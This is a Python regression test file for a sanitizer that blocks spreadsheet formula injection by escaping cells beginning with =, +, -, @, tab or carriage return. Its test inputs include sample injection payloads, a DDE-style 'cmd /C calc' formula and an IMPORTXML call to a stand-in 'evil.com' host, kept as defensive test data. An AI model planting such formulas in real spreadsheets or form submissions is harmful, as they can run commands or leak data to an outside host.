"""
Regression tests for the spreadsheet cell sanitizer that blocks formula injection.

A malicious form submitter can plant a formula like =IMPORTXML(...) or
=HYPERLINK(...) that executes when the sheet owner opens the Sheet.
The sanitizer prefixes dangerous leading characters with an apostrophe so
Google Sheets stores the value as literal text.
"""

from app.services.sheets_client import _sanitize_cell


class TestFormulaInjectionPrefixes:
    def test_equals_prefix_is_neutralised(self):
        assert _sanitize_cell("=SUM(A1:A10)") == "'=SUM(A1:A10)"

    def test_plus_prefix_is_neutralised(self):
        assert _sanitize_cell("+1") == "'+1"

    def test_minus_prefix_is_neutralised(self):
        assert _sanitize_cell("-cmd|' /C calc'!A0") == "'-cmd|' /C calc'!A0"

    def test_at_prefix_is_neutralised(self):
        assert _sanitize_cell("@IMPORTXML('evil.com/x', '/')") == "'@IMPORTXML('evil.com/x', '/')"

    def test_tab_prefix_is_neutralised(self):
        assert _sanitize_cell("\t=1+1") == "'\t=1+1"

    def test_carriage_return_prefix_is_neutralised(self):
        assert _sanitize_cell("\r=evil") == "'\r=evil"


class TestSafeValues:
    def test_plain_text_unchanged(self):
        assert _sanitize_cell("hello world") == "hello world"

    def test_number_string_unchanged(self):
        assert _sanitize_cell("12345") == "12345"

    def test_decimal_unchanged(self):
        assert _sanitize_cell("1.5") == "1.5"

    def test_empty_string_unchanged(self):
        assert _sanitize_cell("") == ""

    def test_url_unchanged(self):
        assert _sanitize_cell("https://example.com") == "https://example.com"

    def test_email_unchanged(self):
        # '@' is dangerous only as a leading char; an email has text before it.
        assert _sanitize_cell("user@example.com") == "user@example.com"

    def test_text_with_internal_equals_unchanged(self):
        assert _sanitize_cell("price=10") == "price=10"


class TestNonStringValues:
    def test_none_passthrough(self):
        assert _sanitize_cell(None) is None

    def test_int_passthrough(self):
        assert _sanitize_cell(42) == 42

    def test_float_passthrough(self):
        assert _sanitize_cell(3.14) == 3.14

    def test_bool_passthrough(self):
        assert _sanitize_cell(True) is True
